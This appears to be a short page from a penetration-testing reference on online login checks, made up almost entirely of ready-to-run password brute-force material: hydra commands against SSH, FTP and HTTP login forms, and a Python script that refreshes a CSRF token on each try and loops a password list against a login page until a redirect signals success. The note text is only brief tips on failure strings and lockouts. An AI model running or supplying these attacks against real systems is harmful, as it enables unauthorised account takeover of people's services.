# Online login checks

[← Passwords quick reference](../07-password-attacks.md)

Check lockout/account scope; capture one known failure including redirect.

```bash
hydra -l <user> -P candidates.txt <target-ip> ssh -t 4
hydra -l <user> -P candidates.txt <target-ip> ftp -t 4
hydra -l <user> -P candidates.txt <target-ip> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Set actual path, fields, failure text. Per-request CSRF needs fresh page + session; example expects `csrf` and `/dashboard`.

```python
import re
import requests

url = "http://TARGET/login"
for password in open("candidates.txt", encoding="utf-8"):
    with requests.Session() as session:
        page = session.get(url)
        match = re.search(r'name="csrf" value="([^"]+)"', page.text)
        if not match:
            raise RuntimeError("CSRF token missing")
        response = session.post(
            url,
            data={"csrf": match.group(1), "username": "admin", "password": password.strip()},
            allow_redirects=False,
        )
        if response.status_code == 302 and response.headers.get("Location") == "/dashboard":
            print("Found:", password.strip())
            break
```

Every attempt succeeds? Recheck known failure, token, and redirect.
